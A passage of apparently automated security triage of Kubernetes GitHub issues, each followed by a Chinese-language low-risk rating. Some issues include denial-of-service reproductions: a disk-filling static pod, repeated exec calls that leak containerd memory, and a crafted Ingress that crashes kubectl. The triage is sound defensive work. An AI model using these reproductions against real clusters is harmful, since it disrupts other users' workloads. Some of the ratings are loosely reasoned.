kubernetes_feature_enabled{name="NodeInclusionPolicyInPodTopologySpread",stage="BETA"} 1
kubernetes_feature_enabled{name="NodeLogQuery",stage="BETA"} 0
kubernetes_feature_enabled{name="NodeOutOfServiceVolumeDetach",stage=""} 1
kubernetes_feature_enabled{name="NodeSwap",stage="BETA"} 1
kubernetes_feature_enabled{name="OpenAPIEnums",stage="BETA"} 1
kubernetes_feature_enabled{name="PDBUnhealthyPodEvictionPolicy",stage="BETA"} 1
kubernetes_feature_enabled{name="PersistentVolumeLastPhaseTransitionTime",stage="BETA"} 1
kubernetes_feature_enabled{name="PodAndContainerStatsFromCRI",stage="ALPHA"} 0
kubernetes_feature_enabled{name="PodDeletionCost",stage="BETA"} 1
kubernetes_feature_enabled{name="PodDisruptionConditions",stage="
```

#### What did you expect to happen?

filter metrics

#### How can we reproduce it (as minimally and precisely as possible)?

change kube-scheduler cmd line

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

1.30.0

</details>


#### Cloud provider

<details>
wmware workstation
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了在kube-scheduler中使用`--allow-metric-labels`参数无法正确过滤metrics的问题。这可能导致metrics端点暴露出更多的指标信息。

根据风险判断标准：

1. **该风险能被攻击者利用**：攻击者可能通过未过滤的metrics获取到集群的一些配置信息或状态信息，辅助进行其他攻击。

2. **风险评级**：暴露的metrics信息通常不包含敏感数据，主要是一些功能特性启用状态等，敏感度较低。按照CVSS 3.1评分标准，可能得分在High以下。

3. **权限控制**：metrics端点通常应受到身份验证和权限控制的保护，未经授权的用户不应直接访问。

综上所述，该问题存在一定的安全风险，但风险等级为低风险。

---

## Issue #126510 The event handlers of job controller are slow

- Issue 链接：[#126510](https://github.com/kubernetes/kubernetes/issues/126510)

### Issue 内容

#### What happened?

The event handlers in job controller are much slower than other controllers. It can cause the ring buffer in the processorListener to grow unbounded when the job churn is high enough.
The processing logic in the job controller events handler appears to be more complicated than other controllers. e.g. in [updateJob](https://github.com/kubernetes/kubernetes/blob/dbc2b0a5c7acc349ea71a14e49913661eaf708d2/pkg/controller/job/job_controller.go#L464-L504), it invokes function `cleanupPodFinalizers` that lists the pods matching some selectors and the enqueue them to another queue. Similarly in [deleteJob](https://github.com/kubernetes/kubernetes/blob/dbc2b0a5c7acc349ea71a14e49913661eaf708d2/pkg/controller/job/job_controller.go#L508-L524).

I added some instrumenting code to understand the latency of each event handler.
For job controller P99:
job add event handler: 0.080 ms
job update event handler: 3.075 ms
job delete event handler: 3.076 ms
pod add event handler: 0.136 ms
pod update event handler: 0.709 ms
pod delete event handler: 0.405 ms

For ttl-after-completion controller P99:
job add event handler: 0.0065 ms
job update event handler: 0.024 ms

The above 2 controllers processes same amount of job objects.

#### What did you expect to happen?

Complicated logic should not be in the job controller event handler. They should be in the reconciler instead.
So that the event handler can be faster and pendingNotification can be drained faster.

#### How can we reproduce it (as minimally and precisely as possible)?

I use a few thousands of cronjobs with TTL after completion.
I will add more details.

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.30
<details>

Current HEAD of master
</details>


#### Cloud provider

EKS



#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了Job Controller的事件处理程序较慢，当Job变动频繁时，processorListener中的环形缓冲区可能会无限增长。这可能导致内存消耗不断增加，最终引发拒绝服务（DoS）攻击的风险。

然而，要利用此漏洞，攻击者需要创建大量的Job或CronJob，从而导致高频率的Job变动。这意味着攻击者需要具备创建Job的权限。

根据风险判断标准第4条，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在High以下。

因此，此Issue存在安全风险，但风险评级在High以下，属于低风险。

---

## Issue #126542 Static Pods never get evicted when under Node Pressure

- Issue 链接：[#126542](https://github.com/kubernetes/kubernetes/issues/126542)

### Issue 内容

#### What happened?

Static Pods are considered critical by [this code] (https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/eviction/eviction_manager.go#L597) and hence never get evicted.

#### What did you expect to happen?

The [doc](https://kubernetes.io/docs/concepts/scheduling-eviction/node-pressure-eviction/#pod-selection-for-kubelet-eviction) says 

> If you are running a [static pod](https://kubernetes.io/docs/concepts/workloads/pods/#static-pods) and want to avoid having it evicted under resource pressure, set the priority field for that Pod directly. Static pods do not support the priorityClassName field.

At least, we should fix the inconsistency between code and doc.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Run a kubelet with fs eviction and static pods
```
apiVersion: kubelet.config.k8s.io/v1beta1
staticPodPath: /home/k8s/manifests
evictionHard:
  imagefs.available: "2Gi"
```

2. Create a static pod spamming disk
```
apiVersion: v1
kind: Pod
metadata:
  name: disk
spec:
  priority: 0
  - name: disk
    image: docker.io/busybox
    command: ["/bin/sh",  "-c", "/bin/dd if=/dev/zero of=/bigfile bs=1G count=102 && sleep 10000"]
```

3. check kubelet logs
> "Eviction manager: cannot evict a critical pod" pod="default/disk"

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>
GCP
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue指出，当节点资源压力过大时，静态Pod（Static Pods）永远不会被驱逐（evicted），因为在代码实现中，静态Pod被视为关键Pod（critical pod），因此被驱逐管理器忽略。

攻击者如果能够创建静态Pod，并运行占用大量资源的任务（如填满磁盘空间的操作），可能导致节点资源耗尽，影响其他Pod的正常运行，造成拒绝服务（DoS）攻击。

然而，创建或修改静态Pod需要对节点文件系统的写权限，通常只有集群管理员或具有高权限的用户才能进行此操作。普通用户无法在未经授权的情况下创建静态Pod。

根据风险判断标准：

- **第4条**：当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。
- **第8条**：如果Issue可能导致拒绝服务攻击，但需要高权限才能实施攻击，则风险应适当降低。

因此，尽管该问题可能导致节点资源耗尽，但由于需要高权限才能被利用，故风险评级为**低风险**。

---

## Issue #126608 kubectl >= 1.30.0 triggers leak of goroutines in containerd on `kubectl exec`

- Issue 链接：[#126608](https://github.com/kubernetes/kubernetes/issues/126608)

### Issue 内容

#### What happened?

Some of our developers were running a workload that regularly does `kubectl exec` into pods running in an EKS cluster with a command that collects some metrics, then exits.

We noticed an increase of memory usage by the containerd process on the host running the pod into which the `kubectl exec` connected. Turning on the debug socket of containerd and comparing the output of the `ctr pprof goroutines` command executed multiple times over the span of several minutes showed that goroutines were leaking inside containerd. All leaked goroutines had a stack trace like this:

```
goroutine 82060 [chan receive]:
k8s.io/apiserver/pkg/util/wsstream.(*Conn).Open(0xc006ba0af0, {0x55fe91acc880?, 0xc0055d8ee0}, 0xc00a1bcb00)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/vendor/k8s.io/apiserver/pkg/util/wsstream/conn.go:185 +0xc5
github.com/containerd/containerd/pkg/cri/streaming/remotecommand.createWebSocketStreams(0xc00a1bcb00?, {0x55fe91acc880, 0xc0055d8ee0}, 0xc0085c17f4, 0xd18c2e28000)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/pkg/cri/streaming/remotecommand/websocket.go:114 +0x32c
github.com/containerd/containerd/pkg/cri/streaming/remotecommand.createStreams(0xc00a1bcb00, {0x55fe91acc880, 0xc0055d8ee0}, 0xc0085c1690?, {0x55fe926be380, 0x4, 0x4}, 0x203001?, 0xc006d8bb00?)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/pkg/cri/streaming/remotecommand/httpstream.go:126 +0x9b
github.com/containerd/containerd/pkg/cri/streaming/remotecommand.ServeExec({0x55fe91acc880?, 0xc0055d8ee0?}, 0x6?, {0x55fe91ab5af8, 0xc0006b0ed0}, {0x0, 0x0}, {0x0, 0x0}, {0xc006b918c0, ...}, ...)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/pkg/cri/streaming/remotecommand/exec.go:61 +0xc5
github.com/containerd/containerd/pkg/cri/streaming.(*server).serveExec(0xc00040a090, 0xc004cfa630, 0xc006be77a0)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/pkg/cri/streaming/server.go:302 +0x19e
github.com/emicklei/go-restful.(*Container).dispatch(0xc00040a1b0, {0x55fe91acc880, 0xc0055d8ee0}, 0xc00a1bcb00)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/vendor/github.com/emicklei/go-restful/container.go:288 +0x8c8
net/http.HandlerFunc.ServeHTTP(0x0?, {0x55fe91acc880?, 0xc0055d8ee0?}, 0x0?)
	/usr/lib/golang/src/net/http/server.go:2084 +0x2f
net/http.(*ServeMux).ServeHTTP(0x72?, {0x55fe91acc880, 0xc0055d8ee0}, 0xc00a1bcb00)
	/usr/lib/golang/src/net/http/server.go:2462 +0x149
github.com/emicklei/go-restful.(*Container).ServeHTTP(0x0?, {0x55fe91acc880?, 0xc0055d8ee0?}, 0xc0074c0000?)
	/builddir/build/BUILD/containerd-1.6.19-1.amzn2.0.1/src/github.com/containerd/containerd/vendor/github.com/emicklei/go-restful/container.go:303 +0x27
net/http.serverHandler.ServeHTTP({0xc004cfa510?}, {0x55fe91acc880, 0xc0055d8ee0}, 0xc00a1bcb00)
	/usr/lib/golang/src/net/http/server.go:2916 +0x43b
net/http.(*conn).serve(0xc0054b1a40, {0x55fe91acdbd8, 0xc003dc2420})
	/usr/lib/golang/src/net/http/server.go:1966 +0x5d7
created by net/http.(*Server).Serve
	/usr/lib/golang/src/net/http/server.go:3071 +0x4db
```

The number of leaked goroutines can be checked with:
```console
$ ctr pprof goroutines | grep createWebSocketStreams | wc -l
```

This looks like the websocket connection from kubelet to containerd is somehow stuck, however the `kubectl exec` command works just fine.

The version of kubectl used by the workload is `v1.30.2`, while the cluster itself is running AWS EKS `v1.26.15-eks-db838b0` (kubelet: `v1.26.4-eks-0a21954`) and we could reproduce this as well on a cluster running `v1.28.11-eks-db838b0` (kubelet: `v1.28.11-eks-1552ad0`).
After checking some versions, it looks like this behavior started with kubectl `v1.30.0` and was not present in `v1.29.4` yet.
We are aware that this is an unsupported version discrepancy, but it shouldn't be possible for a normal user of the Kubernetes API to trigger a memory leak in the container runtime by simply running `kubectl exec` repeatedly against a pod with an incompatible version of kubectl.

#### What did you expect to happen?

Neither kubectl nor any other Kubernetes API client should be able to cause a memory leak in the container runtime of the host running the affected pod.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Start an EKS cluster v1.26 or v1.28 (probably 1.27 or earlier versions and plain Kubernetes clusters are affected as well, but we couldn't check this) and ensure some nodes are up and running and some pods are running as well.
2. SSH into a node and enable the containerd debug socket by appending the following to `/etc/containerd/config.toml`:
    ```toml
    [debug]
      address = "/run/containerd/debug.sock"
    ```
    Then restart containerd with `systemctl restart containerd`, then run:
    ```console
    $ watch "ctr pprof goroutines | grep createWebSocketStreams | wc -l"
    ```
4. In a second terminal, run `kubectl exec <pod name> -- true` or similar repeatedly against any pod running on the node on which you SSH'd.
5. Notice the number reported by the `watch` command increase for every execution of `kubectl`.

#### Anything else we need to know?

We were unsure where the right place to report this issue would be. We believe containerd should have timeout on this goroutine to abort it if something gets stuck. On the other hand, this can only be triggered with a newer certain version of kubectl, which also hints a bug in the Kubernetes API server or in kubelet.

#### Kubernetes version

<details>

1.26 cluster:
```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.26.15-eks-db838b0
WARNING: version difference between client (1.30) and server (1.26) exceeds the supported minor version skew of +/-1
```

1.28 cluster:
```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.11-eks-db838b0
WARNING: version difference between client (1.30) and server (1.28) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

1.26 cluster:
```console
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
$ uname -a
Linux ip-a-b-c-d.us-east-2.compute.internal 5.10.179-168.710.amzn2.x86_64 #1 SMP Mon May 22 23:10:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

1.28 cluster:
```console
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"

$ uname -a
Linux ip-a-b-c-d.us-east-1.compute.internal 5.10.220-209.869.amzn2.x86_64 #1 SMP Wed Jul 17 15:10:20 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Verified on containerd `1.6.19` and `1.7.11`
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
问题描述了当使用不兼容版本的kubectl客户端（v1.30.2及以上）对较低版本的Kubernetes集群（v1.26或v1.28）执行`kubectl exec`操作时，会导致运行在节点上的containerd进程出现goroutine泄漏，内存使用量增加。这可能被具有`kubectl exec`权限的用户利用，通过多次执行`kubectl exec`导致节点内存耗尽，造成拒绝服务（DoS）攻击。

根据风险判断标准：

1. **该风险能被攻击者利用**，但前提是攻击者具有执行`kubectl exec`的权限。

4. **对于拒绝服务（DoS）攻击**，如果攻击者需要一定权限才能实施该攻击，且需要具备创建、修改等非只读权限，则不应判断为高风险，CVSS评级在high以下。

因此，尽管存在安全风险，但由于需要一定权限，且属于DoS攻击范畴，根据标准，该风险评级应判断为**低风险**。

---

## Issue #126662 QosClass of pod status shouldn't be changeable

- Issue 链接：[#126662](https://github.com/kubernetes/kubernetes/issues/126662)

### Issue 内容

#### What happened?

According to this [code](https://github.com/kubernetes/kubernetes/blob/bbe8ca8b2ab14992389bc67e3bcfa209adcb13d4/pkg/apis/core/validation/validation.go#L4996), the QosClass of pod status is immutable. 

This [function ](https://github.com/kubernetes/kubernetes/blob/40b604e374144351eac463e7077fdb1903f5a033/pkg/apis/core/helper/qos/qos.go#L48
)also shows that QosClass is computed from the resources instead of being provided by users. 


However, we can use rest api or "kubectl edit pod <podName> --subresource='status'" to change it. 




#### What did you expect to happen?

The request to change QoSClass of pod status should receive a validation error to indicate it's immutable. 

#### How can we reproduce it (as minimally and precisely as possible)?

Use "kubectl edit pod <podName> --subresource='status'" to change the qosClass to a different value. It will succeed. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.4
```

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
Issue指出，在Kubernetes中，Pod的QoSClass属性应该是不可变的，且是根据Pod的资源请求和限制计算得出的。但是，通过REST API或`kubectl edit pod <podName> --subresource='status'`，可以修改Pod的QoSClass。

这个问题的潜在风险在于，攻击者可能通过修改Pod的QoSClass，提升自己Pod的QoS级别（如从Burstable提升到Guaranteed），从而在资源紧张时避免被驱逐，影响集群中其他用户的Pod被优先驱逐。

然而，需要注意的是，执行此操作需要对Pod的status子资源具有编辑权限。通常情况下，编辑Pod的status子资源需要较高的权限，普通用户通常不具备该权限。

根据风险判断标准：

- **标准1**：该风险能被攻击者利用，但需要较高权限。
- **标准4**：当漏洞利用需要攻击者具备创建、修改等非只读权限时，不应判断为高风险，CVSS评级在high以下。

因此，综合判断，该Issue存在安全风险，但风险评级为低风险。

---

## Issue #126643 kube-scheduler updates pod status mistakenly during preemption

- Issue 链接：[#126643](https://github.com/kubernetes/kubernetes/issues/126643)

### Issue 内容

#### What happened?

When a pod with "BestEffort" of qosClass is preempted by a higher priority pod whose qolClass is "Burstable", the victim pod's qosClass will be updated to "Burstable" because [the scheduler will update the victim's status with the content from higher priority pod before deleting the victim pod](https://github.com/kubernetes/kubernetes/blob/34e620d18c036acf035cb42c6f445dd568f60303/pkg/scheduler/framework/preemption/preemption.go#L375). The pod then will be stuck in terminating state after deleting because of this [check](https://github.com/kubernetes/kubernetes/blob/bbe8ca8b2ab14992389bc67e3bcfa209adcb13d4/pkg/apis/core/validation/validation.go#L4996). Supposedly, kubelet will reconcile the status back very soon. However, the deletion request stops kubelet from doing that.

#### What did you expect to happen?

The victim pod's qosClass shouldn't be changed and the pod should be deleted successfully. 

#### How can we reproduce it (as minimally and precisely as possible)?

 reproduced it on 1.29.4

Reproduce steps:
Scale the node number to 1
- Create victim pod (here I use a cronjob to create a pod with empty resources)
- Create a higher priority class(p1) with "Preempt" policy.
- Create extra pods(using a deployment) with priorityClassName as "p1" to make the pod number beyond the maxim pod number of the node. The pods also have cpu/memory requests set.
- The victim pod will be preempted, then stuck in "terminating" state
[cronjob.txt](https://github.com/user-attachments/files/16592258/cronjob.txt)
[deployment.txt](https://github.com/user-attachments/files/16592259/deployment.txt)
[pc.txt](https://github.com/user-attachments/files/16592260/pc.txt)


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.4
```

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes中，当一个"BestEffort"的Pod被一个具有更高优先级且qosClass为"Burstable"的Pod抢占时，受害Pod的qosClass会被错误地更新为"Burstable"。这导致受害Pod在删除时因验证失败而卡在"Terminating"状态。

根据风险判断标准：

1. **该风险能被攻击者利用**：攻击者需要具备创建高优先级Pod的权限，才能触发该问题。

4. **在拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理**：此情况下，攻击者需要具备创建或修改Pod的权限，因此不应判断为高风险，CVSS评级在high以下。

因此，该问题属于低风险的安全问题，属于拒绝服务类型，且需要一定的权限才能被利用。

---

## Issue #126631 kubectl: panic when describe ingress with no Backend

- Issue 链接：[#126631](https://github.com/kubernetes/kubernetes/issues/126631)

### Issue 内容

#### What happened?

k describe ing test-ing-without-backend

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x2 addr=0x0 pc=0x1017fde94]

goroutine 1 [running]:
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/describe.(*IngressDescriber).describeBackendV1(0x140005d3070?, {0x140005c7057?, 0x1019d6ab8?}, 0x13?)
	vendor/k8s.io/kubectl/pkg/describe/describe.go:2593 +0x24
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/describe.(*IngressDescriber).describeIngressV1.func1({0x10226f920?, 0x140003a0000})
	vendor/k8s.io/kubectl/pkg/describe/describe.go:2667 +0x338
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/describe.tabbedString(0x140008c9a08)
	vendor/k8s.io/kubectl/pkg/describe/describe.go:5245 +0x80
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/describe.(*IngressDescriber).describeIngressV1(0x12b104420?, 0x14000d886b0?, 0x1022749e0?)
	vendor/k8s.io/kubectl/pkg/describe/describe.go:2627 +0x40
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/describe.(*IngressDescriber).Describe(0x14000d889a0, {0x14000c071b5, 0x5}, {0x16f6e346d, 0xd}, {0x0?, 0x14000ad3b28?})
	vendor/k8s.io/kubectl/pkg/describe/describe.go:2553 +0x150
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/cmd/describe.(*DescribeOptions).Run(0x1400060e320)
	vendor/k8s.io/kubectl/pkg/cmd/describe/describe.go:193 +0x40c
k8s.io/kubernetes/vendor/k8s.io/kubectl/pkg/cmd/describe.NewCmdDescribe.func1(0x1400060c500?, {0x14000111760?, 0x2?, 0x2?})
	vendor/k8s.io/kubectl/pkg/cmd/describe/describe.go:113 +0x64
k8s.io/kubernetes/vendor/github.com/spf13/cobra.(*Command).execute(0x1400060c500, {0x14000111700, 0x2, 0x2})
	vendor/github.com/spf13/cobra/command.go:860 +0x4ac
k8s.io/kubernetes/vendor/github.com/spf13/cobra.(*Command).ExecuteC(0x14000935900)
	vendor/github.com/spf13/cobra/command.go:974 +0x354
k8s.io/kubernetes/vendor/github.com/spf13/cobra.(*Command).Execute(...)
	vendor/github.com/spf13/cobra/command.go:902
k8s.io/kubernetes/vendor/k8s.io/component-base/cli.run(0x14000935900)
	vendor/k8s.io/component-base/cli/run.go:146 +0x2a4
k8s.io/kubernetes/vendor/k8s.io/component-base/cli.RunNoErrOutput(...)
	vendor/k8s.io/component-base/cli/run.go:84
main.main()
	cmd/kubectl/kubectl.go:30 +0x20
```



#### What did you expect to happen?

k describe ing test-ing-without-backend  work without error
 

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: test-ing-without-backend
  annotations:
    nginx.ingress.kubernetes.io/server-snippet: |
      location = / {
        return 200 'OK';
      }
spec:
  rules:
  - host: a.com
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"24", GitVersion:"v1.24.12", GitCommit:"ef70d260f3d036fc22b30538576bbf6b36329995", GitTreeState:"clean", BuildDate:"2023-03-15T13:37:18Z", GoVersion:"go1.19.7", Compiler:"gc", Platform:"darwin/arm64"}
Kustomize Version: v4.5.4
Server Version: version.Info{Major:"1", Minor:"29", GitVersion:"v1.29.5-gke.1091002", GitCommit:"0126fa256b86df67042c3c08915a8f633f2ab5f5", GitTreeState:"clean", BuildDate:"2024-05-29T09:14:46Z", GoVersion:"go1.21.9 X:boringcrypto", Compiler:"gc", Platform:"linux/amd64"}
WARNING: version difference between client (1.24) and server (1.29) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了当使用kubectl描述一个没有Backend的Ingress时，会导致kubectl客户端发生panic并崩溃。攻击者可以通过创建一个特殊的Ingress资源，引诱其他用户使用kubectl描述该Ingress，从而导致他们的kubectl客户端崩溃。

然而，攻击者需要具备创建或修改Ingress资源的权限才能实施此攻击。根据风险判断标准第4条，针对拒绝服务（DoS）攻击，如果攻击者需要一定权限才能够实施该攻击，且需要创建、修改等非只读权限，则不应判断为高风险，CVSS评级在high以下。

因此，该Issue存在安全风险，但风险评级在high以下，判断为低风险。

**复现过程：**

```json
[
  {
    "cmd": "cat > ingress.yaml <<EOF\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: test-ing-without-backend\n  annotations:\n    nginx.ingress.kubernetes.io/server-snippet: |\n      location = / {\n        return 200 'OK';\n      }\nspec:\n  rules:\n  - host: a.com\nEOF",
    "explain": "创建一个没有Backend的Ingress资源文件。"
  },
  {
    "cmd": "kubectl apply -f ingress.yaml",
    "explain": "应用Ingress配置，创建Ingress资源。"
  },
  {
    "cmd": "kubectl describe ing test-ing-without-backend",
    "explain": "描述该Ingress资源，触发kubectl客户端的panic崩溃。"
  }
]
```

---

## Issue #126746 kube-proxy fails with CreateContainerConfigError when joining a 1.30.0 node to 1.30.4 cluster

- Issue 链接：[#126746](https://github.com/kubernetes/kubernetes/issues/126746)

### Issue 内容

#### What happened?

I have a cluster which is 1.30.4 and I am trying to join a node to the cluster that is 1.31.0, and the kube-proxy fails to start, and the status is `CreateContainerConfigError` . 

`kubectl describe pod` events show:
```
Events:
  Type     Reason     Age                From               Message
  ----     ------     ----               ----               -------
  Normal   Scheduled  65s                default-scheduler  Successfully assigned kube-system/kube-proxy-gc7zf to server2
  Normal   Pulled     11s (x6 over 63s)  kubelet            Container image "registry.k8s.io/kube-proxy:v1.30.4" already present on machine
  Warning  Failed     11s (x6 over 63s)  kubelet            Error: services have not yet been read at least once, cannot construct envvars
```
The kubelet logs shows:
`GET https://<apiserverip of cluster>:6443/api/v1/services?fieldSelector=spec.clusterIP%21%3DNone&limit=500&resourceVersion=0 400 Bad Request in 7 milliseconds`

And the response is 
`failed to list *v1.Service: "spec.clusterIP" is not a known field selector: only "metadata.name", "metadata.namespace"`

All-Beta=False feature-gate is coded for all components. 
Enabling the `CustomResourceFieldSelectors` on the downlevel node seemed to have no effect.

The problem seems to be that even though the joining node downloaded the correct images and start the pods, the kubelet of course is still at 1.31.0.   I suspect installing a downlevel kubelet will allow it to work.

Is this even a supported thing to do?  i.e.  join a downlevel cluster with an uplevel node? 

#### What did you expect to happen?

I would have expected with AllBeta=False, that the request would not be sent with `spec.clusterIP`  
I also would have also expected that enabling the `CustomResourceFieldSelectors` on the downlevel node would have allowed the spec.clusterIP field selector.

#### How can we reproduce it (as minimally and precisely as possible)?

Bring up an 1.30.4 node with `kubeadm init`
Attempt to join a 1.31.0 node to the cluster.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4

```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
Linux server1 5.4.0-186-generic #206-Ubuntu SMP Fri Apr 26 12:31:10 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
1.30.0
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在将一个运行1.31.0版本的节点加入到一个运行1.30.4版本的Kubernetes集群时，kube-proxy无法启动并报错。错误信息显示由于API版本不兼容，导致在使用字段选择器时参数无效。

潜在的安全风险在于，如果存在版本不兼容的问题，可能会导致服务中断（DoS），影响集群的可用性。然而，此问题需要管理员级别的权限才能尝试将高版本的节点加入低版本的集群，属于操作配置不当引起的问题。

根据风险判断标准第4条，当风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能实施该攻击，如需要创建、修改等非只读权限，则不应判断为高风险，CVSS评级在high以下。

因此，该Issue中存在一定的安全风险，但风险评级在high以下，判断为低风险。

---

## Issue #126711 static pod stuck in "Waiting for volumes to unmount for pod" for a longtime on single node by chance

- Issue 链接：[#126711](https://github.com/kubernetes/kubernetes/issues/126711)

### Issue 内容

#### What happened?

